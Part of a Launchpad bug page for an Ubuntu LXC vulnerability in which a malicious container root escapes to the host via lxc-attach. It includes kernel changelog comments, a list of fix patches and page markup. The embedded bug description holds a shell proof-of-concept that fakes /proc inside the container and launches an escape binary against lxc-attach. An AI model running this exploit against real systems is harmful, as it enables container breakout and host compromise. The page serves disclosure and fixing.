    - x86/pkeys: Make protection keys an "eager" feature
    - x86/cpu: Rename Merrifield2 to Moorefield
    - x86/platform/intel-mid: Add Intel Penwell to ID table
    - x86/platform/intel-mid: Keep SRAM powered on at boot
    - x86/apic: Get rid of apic_version[] array
    - arch/x86: Handle non enumerated CPU after physical hotplug
    - x86/mm/pkeys: Do not skip PKRU register if debug registers are not used
    - x86/dumpstack: Fix x86_32 kernel_stack_pointer() previous stack access
    - ARM: fix delays
    - ARM: dts: mvebu: armada-390: add missing compatibility string and bracket
    - ARM: dts: MSM8064 remove flags from SPMI/MPP IRQs
    - ARM: dts: MSM8660 remove flags from SPMI/MPP IRQs
    - ARM: cpuidle: Fix error return code
    - Bluetooth: Add a new 04ca:3011 QCA_ROME device
    - ima: use file_dentry()
    - tpm: fix a race condition in tpm2_unseal_trusted()
    - tpm_crb: fix crb_req_canceled behavior
    - Linux 4.8.2

  * Bluetooth 04ca:3011 [Asus Aspire V3-371] doesn't work (LP: #1535802)
    - Bluetooth: Add a new 04ca:3011 QCA_ROME device

 -- Luis Henriques &lt;luis.henriques@canonical.com&gt;  Fri, 11 Nov 2016 10:30:54 +0000</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in linux (Ubuntu Yakkety): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Fix Committed &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/66" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-06T09:19:54.109054+00:00" title="2016-12-06 09:19:54 UTC">on 2016-12-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/66"> #66</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package linux - 4.8.0-30.32</p>
<p>---------------<br />
linux (4.8.0-30.32) yakkety; urgency=low</p>
<p>&nbsp;&nbsp;* CVE-2016-8655 (LP: <a href="/bugs/1646318" class="bug-link">#1646318</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- packet: fix race condition in packet_set_ring</p>
<p>&nbsp;-- Brad Figg &lt;email address hidden&gt;  Thu, 01 Dec 2016 08:02:53 -0800</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug was fixed in the package linux - 4.8.0-30.32

---------------
linux (4.8.0-30.32) yakkety; urgency=low

  * CVE-2016-8655 (LP: #1646318)
    - packet: fix race condition in packet_set_ring

 -- Brad Figg &lt;brad.figg@canonical.com&gt;  Thu, 01 Dec 2016 08:02:53 -0800</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in linux (Ubuntu): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Triaged &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        <div style="float: right;">
          <a class="menu-link-activitylog" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+activity">See full activity log</a>
        </div>
        <div class="clearfix"></div>

        
          

          
            <div align="center" id="add-comment-login-first">
              To post a comment you must <a href="+login?comments=all">log in</a>.
            </div>
          
        
        
      

      </div><!-- class="top-portlet" -->
      </div><!--- id="maincontentsub"-->
      <div>
        <div id="duplicate-form-container"></div>
        <div id="privacy-form-container"></div>
      </div>
    </div>
            
            
          </div><!-- yui-b -->
        </div><!-- yui-main -->

        
          <div id="side-portlets" class="yui-b side">
            
      <div id="involvement" class="portlet">
        <ul class="involvement">
          <li class="single">
            <a class="sprite bugs" href="/ubuntu/+source/lxc/+filebug">
              Report a bug
            </a>
          </li>
        </ul>
      </div>
      <div id="privacy" class="first portlet public">
  <div id="privacy-text">
     <span id="information-type-summary" class="sprite public">This report contains
         <strong id="information-type">Public Security</strong>
         information
     </span>&nbsp;<a class="sprite edit action-icon" id="privacy-link" href="/ubuntu/+source/lxc/+bug/1639345/+secrecy">Edit</a>

     <div id="information-type-description" style="padding-top: 5px">Everyone can see this security related information.
</div>
  </div>
</div>

      <div id="portlet-actions" class="portlet vertical">
  <ul id="duplicate-actions">
    <li class="sprite bug-dupe">
    <span id="mark-duplicate-text">
    <a class="menu-link-mark-dupe" href="/ubuntu/+source/lxc/+bug/1639345/+duplicate">Mark as duplicate</a>
    </span>
    </li>
    
    <li><a class="menu-link-createquestion sprite add" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+create-question">Convert to a question</a></li>
    
    <li><a class="menu-link-addbranch sprite add" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+addbranch">Link a related branch</a></li>
    <li><a class="menu-link-linktocve sprite add" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+linkcve">Link to <abbr title="Common Vulnerabilities and Exposures Index">CVE</abbr></a></li>
    <li><a class="menu-link-unlinkcve sprite modify remove" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+unlinkcve">Remove CVE link</a></li>
  </ul>
</div>

      

      <div class="portlet vertical" id="portlet-subscription">
  <div class="section">
    <div id="current_user_subscription" class="False">
      
        <span>You are</span>
        
        <a class="menu-link-subscription sprite modify edit" href="/ubuntu/+source/lxc/+bug/1639345/+subscribe">
           
           
           
           not directly subscribed to this bug's notifications.
        </a>
      
      
    </div>
    <div id="sub-unsub-spinner">Subscribing...</div>
    <ul>
      
      <li><a class="menu-link-editsubscriptions sprite modify edit" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+subscriptions" title="View and change your subscriptions to this bug">Edit bug mail</a></li>
    </ul>
  </div>
  <script type="text/javascript">
    LPJS.use('io-base', 'node',
            'lp.bugs.bugtask_index.portlets.subscription', function(Y) {
        Y.on('domready', function() {
            Y.lp.bugs.bugtask_index.portlets.subscription.initialize();
        });
    });
  </script>
</div>

      <div class="portlet vertical" id="portlet-subscribers">
  <h2>Other bug subscribers</h2>
  <div>
    <div><a class="menu-link-addsubscriber sprite add" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+addsubscriber" title="Launchpad will email that person whenever this bugs changes">Subscribe someone else</a></div>
  </div>
  <div id="other-bug-subscribers"></div>
</div>

      

      

      
  <div class="portlet" id="portlet-patches">
    <h2>Patches</h2>
    <ul>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+attachment/4774507/+files/0001-attach-prevent-stealing-proc-fd-by-container.patch">0001-attach-prevent-stealing-proc-fd-by-container.patch</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1639345/+attachment/4774507">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+attachment/4774931/+files/0001-attach-do-not-send-procfd-to-attached-process.patch">attach: do not send procfd to attached process</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1639345/+attachment/4774931">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+attachment/4777815/+files/0001-attach-do-not-send-procfd-to-attached-process.patch">0001-attach-do-not-send-procfd-to-attached-process.patch</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1639345/+attachment/4777815">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+attachment/4779383/+files/0001-attach-do-not-send-procfd-to-attached-process.patch">LXC patch for master.</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1639345/+attachment/4779383">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+attachment/4779384/+files/0001-attach-do-not-send-procfd-to-attached-process_stable-2.0.patch">LXC patch for stable-2.0.</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1639345/+attachment/4779384">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+attachment/4779385/+files/0001-attach-do-not-send-procfd-to-attached-process_stable-1.0.patch">LXC patch for stable-1.0.</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1639345/+attachment/4779385">edit</a>)
        </small>
      </li>
    </ul>
    <ul>
      <li>
        <a class="sprite add" href="/ubuntu/+source/lxc/+bug/1639345/+addcomment?field.patch=on">Add patch</a>
      </li>
    </ul>
  </div>
  <div class="portlet" id="portlet-attachments">
    <h2>Bug attachments</h2>
    <ul>
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+attachment/4772615/+files/LxcAttachEscape.c">LxcAttachEscape.c</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1639345/+attachment/4772615">edit</a>)
        </small>
      </li>
    </ul>
    <ul>
      <li>
        <a class="sprite add" href="/ubuntu/+source/lxc/+bug/1639345/+addcomment">Add attachment</a>
      </li>
    </ul>
  </div>


      

    
          </div><!-- yui-b side -->
        
      </div><!-- yui-t4 -->

      
  <div id="footer" class="footer">
    <div class="lp-arcana">
        <div class="lp-branding">
          <a href="https://launchpad.net/"><img src="/@@/launchpad-logo-and-name-hierarchy.png" alt="Launchpad" /></a>
          &nbsp;&bull;&nbsp;
          <a href="https://launchpad.net/+tour">Take the tour</a>
          &nbsp;&bull;&nbsp;
          <a href="https://help.launchpad.net/">Read the guide</a>
          &nbsp;
          <form id="globalsearch" method="get" accept-charset="UTF-8" action="https://launchpad.net/+search">
            <input type="search" id="search-text" name="field.text" />
            <input type="image" src="/@@/search" style="vertical-align:5%" alt="Search Launchpad" />
          </form>
        </div>
        
  

    </div>

    <div class="colophon">
      &copy; 2004-2021
      <a href="http://canonical.com/">Canonical&nbsp;Ltd.</a>
      &nbsp;&bull;&nbsp;
      <a href="https://launchpad.net/legal">Terms of use</a>
      &nbsp;&bull;&nbsp;
      <a href="https://www.ubuntu.com/legal/dataprivacy">Data privacy</a>
      &nbsp;&bull;&nbsp;
      <a href="/feedback">Contact Launchpad Support</a>
      
      &nbsp;&bull;&nbsp;
      <a href="http://blog.launchpad.net/">Blog</a>
      
	&nbsp;&bull;&nbsp;
	<a href="https://canonical.com/careers">Careers</a>
      
      &nbsp;&bull;&nbsp;
      <a href="https://twitter.com/launchpadstatus">System status</a>
      <span id="lp-version">
      &nbsp;&bull;&nbsp;
        r0d8de2b
        
        
        (<a href="https://dev.launchpad.net/">Get the code!</a>)
      </span>
    </div>
  </div>

    </div><!-- yui-d0-->

    
  
  
  <script id="json-cache-script">LP.cache = {"subscribers_portlet_url_data": {"web_link": "https://bugs.launchpad.net/bugs/1639345", "self_link": "https://bugs.launchpad.net/api/devel/bugs/1639345"}, "information_type_data": {"PUBLIC": {"description": "Everyone can see this information.\n", "name": "Public", "is_private": false, "order": 0, "description_css_class": "choice-description", "value": "PUBLIC"}, "PUBLICSECURITY": {"description": "Everyone can see this security related information.\n", "name": "Public Security", "is_private": false, "order": 1, "description_css_class": "choice-description", "value": "PUBLICSECURITY"}, "USERDATA": {"description": "Only shared with users permitted to see private user information.\n", "name": "Private", "is_private": true, "order": 3, "description_css_class": "choice-description", "value": "USERDATA"}, "PRIVATESECURITY": {"description": "Only the security group can see this information.\n ", "name": "Private Security", "is_private": true, "order": 2, "description_css_class": "choice-description", "value": "PRIVATESECURITY"}}, "total_comments_and_activity": 130, "bug_is_private": false, "related_features": {}, "first visible_recent_comment": 26, "bug": {"self_link": "https://bugs.launchpad.net/api/devel/bugs/1639345", "web_link": "https://bugs.launchpad.net/bugs/1639345", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug", "id": 1639345, "private": false, "information_type": "Public Security", "name": null, "title": "lxc-attach to malicious container allows access to host", "description": "A malicious root user in an unprivileged container may interfere with lxc-attach to provide manipulated guest proc file system information to disable dropping of capabilities and may in the end access the host file system by winning a very easy race against lxc-attach.\n\nIn guest sequence:\n\ncat \u003c\u003cEOF \u003e /tmp/test\n#!/bin/bash -e\nrm -rf /test || true\nmkdir -p /test/sys/kernel\necho \"proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0\" \u003e /test/mounts\necho 0 \u003e /test/sys/kernel/cap_last_cap\nmkdir -p /test/self\nmknod /test/self/status p\ncd /proc\nmount -o bind /test /proc\nwhile true; do\n  pid=\\$(ls -al */exe | grep lxc-attach | sed -r -e 's/.* ([0-9]+)\\\\/exe -\u003e.*/\\\\1/')\n  if [ \"\\${pid}\" != \"\" ]; then\n    cd /\n    umount -i -f -l -n /proc\n    exec /LxcAttachEscape \"\\${pid}\" /bin/bash\n  fi\n  sleep 1\ndone\nEOF\n\nSee attachment for LxcAttachEscape.c\n\nExploit uses fixed fd=7 for attacking, on other test environment, it might be other fd. Tests were performed by attacking lxc-attach started by\n\nscreen lxc-attach -n [guestname]\n\nwhich is the sequence required against the TTY-stealing attacks also not fixed in all lxc-attach versions.\n\nIn my opinion two bugs might need fixing:\n* lxc-attach should not use untrusted/manipulated information for proceeding\n* kernel should prevent against ptracing of lxc-attach as it was created in another USERNS\n\n\n# lsb_release -r -d\nDescription:    Ubuntu 16.04.1 LTS\nRelease:        16.04\n\n# apt-cache policy lxc1\nlxc1:\n  Installed: 2.0.5-0ubuntu1~ubuntu16.04.2\n  Candidate: 2.0.5-0ubuntu1~ubuntu16.04.2\n  Version table:\n *** 2.0.5-0ubuntu1~ubuntu16.04.2 500\n        500 http://debarchive-ehealth.d03.arc.local/ubuntu xenial-updates/main amd64 Packages\n        100 /var/lib/dpkg/status\n     2.0.0-0ubuntu2 500\n        500 http://debarchive-ehealth.d03.arc.local/ubuntu xenial/main amd64 Packages", "owner_link": "https://bugs.launchpad.net/api/devel/~roman-fiedler-deactivatedaccount", "bug_tasks_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1639345/bug_tasks", "duplicate_of_link": null, "date_created": "2016-11-04T20:30:53.202371+00:00", "activity_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1639345/activity", "subscriptions_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1639345/subscriptions", "date_last_updated": "2016-12-06T09:21:26.883054+00:00", "who_made_private_link": null, "date_made_private": null, "heat": 266, "bug_watches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1639345/bug_watches", "cves_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1639345/cves", "duplicates_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1639345/duplicates", "attachments_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1639345/attachments", "security_related": true, "latest_patch_uploaded": "2016-11-18T16:08:08.190774+00:00", "tags": ["bot-stop-nagging", "kernel-da-key", "verification-done-trusty", "verification-done-vivid", "verification-done-xenial", "verification-done-yakkety"], "date_last_message": "2016-12-06T09:19:54.109054+00:00", "number_of_duplicates": 0, "message_count": 67, "users_affected_count": 1, "users_unaffected_count": 0, "users_affected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1639345/users_affected", "users_unaffected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1639345/users_unaffected", "users_affected_count_with_dupes": 1, "other_users_affected_count_with_dupes": 1, "users_affected_with_dupes_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1639345/users_affected_with_dupes", "messages_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1639345/messages", "linked_branches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1639345/linked_branches", "linked_merge_proposals_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1639345/linked_merge_proposals", "http_etag": "\"2a99b3bb94ad68fe4aac3c6be224b9689de299a6-fcbacdd06a89d87e2529f3fb6cb52e9c8ec84d17\""}, "context": {"self_link": "https://bugs.launchpad.net/api/devel/ubuntu/+source/lxc/+bug/1639345", "web_link": "https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug_task", "bug_link": "https://bugs.launchpad.net/api/devel/bugs/1639345", "milestone_link": null, "status": "Fix Released", "importance": "Critical", "assignee_link": "https://bugs.launchpad.net/api/devel/~cbrauner", "bug_target_display_name": "lxc (Ubuntu)", "bug_target_name": "lxc (Ubuntu)", "bug_watch_link": null, "date_assigned": "2016-11-09T07:36:41.007113+00:00", "date_created": "2016-11-04T20:30:53.202371+00:00", "date_confirmed": "2016-11-09T07:36:21.894667+00:00", "date_incomplete": null, "date_in_progress": "2016-11-23T16:17:17.622270+00:00", "date_closed": "2016-11-23T16:17:17.622270+00:00", "date_left_new": "2016-11-09T07:36:21.894667+00:00", "date_triaged": "2016-11-09T07:36:21.894667+00:00", "date_fix_committed": "2016-11-23T16:17:17.622270+00:00", "date_fix_released": "2016-11-23T16:17:17.622270+00:00", "date_left_closed": null, "owner_link": "https://bugs.launchpad.net/api/devel/~roman-fiedler-deactivatedaccount", "target_link": "https://bugs.launchpad.net/api/devel/ubuntu/+source/lxc", "title": "Bug #1639345 in lxc (Ubuntu): \"lxc-attach to malicious container allows access to host\"", "related_tasks_collection_link": "https://bugs.launchpad.net/api/devel/ubuntu/+source/lxc/+bug/1639345/related_tasks", "is_complete": true, "http_etag": "\"36cc220056cd9c28402a43aea6531337cab208cd-ed12f06789f68eb98307f7d52bc5f869f785a2af\""}, "initial_comment_batch_offset": 41};</script>

    
  

    
  </body>


  <!--
    Facet name: bugs
    Page type: main_side
    Has global search: True
    Has application tabs: True
    Has side portlets: True

    At least 66 queries/external actions issued in 2.02 seconds

    Features: {'app.maintenance_message': None, 'visible_render_time': None, 'bugs.affected_count_includes_dupes.disabled': None, 'app.mainsite_only.canonical_url': None, 'bugs.nominations.bug_supervisors_can_target': 'on', 'baselayout.careers_link.disabled': None, 'hard_timeout': '9000', 'js.yui_version': None, 'profiling.enabled': None}

    r0d8de2b

    -->

</html>

